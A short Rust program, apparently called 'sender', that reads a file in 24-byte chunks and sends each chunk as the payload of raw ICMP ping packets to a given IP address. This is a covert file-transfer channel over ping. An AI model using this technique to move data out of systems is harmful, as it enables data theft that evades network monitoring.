use std::env::args;
use std::fs::File;
use std::io::Read;
use std::net::IpAddr;

const BUFFER_SIZE: usize = 24;

fn main() {
    let mut args = args();
    if args.len() != 3 {
        panic!("Usage: sender <IP> <FILE>");
    }
    let ip = args.nth(1).unwrap().parse::<IpAddr>().unwrap();
    let path = args.next().unwrap();

    let mut file = File::open(path).unwrap();
    let total_len = file.metadata().unwrap().len();

    let id = (total_len as usize + BUFFER_SIZE - 1) / BUFFER_SIZE;
    let id: u16 = match id.try_into() {
        Ok(x) => x,
        Err(_) => panic!("file too large"),
    };
    let mut seq_cnt: u16 = 1;

    loop {
        let mut buf = [0; BUFFER_SIZE];
        let nbytes = file.read(&mut buf).unwrap();
        if nbytes == 0 {
            break;
        }
        ping::rawsock::ping(ip, None, None, Some(id), Some(seq_cnt), Some(&buf)).unwrap();
        seq_cnt += 1;
    }
}
